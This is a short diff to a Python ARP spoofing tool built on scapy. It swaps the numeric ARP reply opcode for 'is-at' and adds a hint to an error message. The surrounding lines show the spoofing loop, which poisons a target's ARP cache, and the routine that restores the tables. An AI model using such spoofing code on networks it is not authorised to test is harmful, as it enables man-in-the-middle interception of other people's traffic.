@@ -41,7 +41,7 @@ class ArpSpoofer:
         else:
             while self.isRunning:
                 self.logger.debug(f"Tell target {targetIp} that spoofed IP address {spoofIp} is at our MAC address")
-                packet = scapy.ARP(op=2, pdst=targetIp, hwdst=self.targetMac, psrc=(spoofIp))
+                packet = scapy.ARP(op="is-at", pdst=targetIp, hwdst=self.targetMac, psrc=(spoofIp))
                 scapy.send(packet, verbose=False)
                 time.sleep(1)
 
@@ -57,7 +57,7 @@ class ArpSpoofer:
             self.logger.info(f"Restoring ARP tables for target {targetIp} and spoofed IP address {source_ip}")
             self.logger.debug(f"Tell target {targetIp} the correct MAC-Adress for spoofed IP address {source_ip}")
             source_mac = scapy.getmacbyip(source_ip)
-            packet = scapy.ARP(op=2, pdst=targetIp, hwdst=self.targetMac, psrc=source_ip, hwsrc=source_mac)
+            packet = scapy.ARP(op="is-at", pdst=targetIp, hwdst=self.targetMac, psrc=source_ip, hwsrc=source_mac)
             scapy.send(packet, verbose=False)
         except Exception as e:
             self.logger.error(f"Error while restoring ARP tables: {e}")
@@ -93,7 +93,7 @@ class ArpSpoofer:
         gateway = self.get_default_gateway_ip(self.interface)
 
         if ip_address(targetIp) not in subnet:
-            self.logger.critical(f"Target IP address {targetIp} is not in the same subnet as the host! Exiting...")
+            self.logger.critical(f"Target IP address {targetIp} is not in the same subnet as the host! Forgot -I? Exiting...")
             sys.exit(1)
         elif ip_address(spoofIp) not in subnet:
             if gateway == interface_ip:
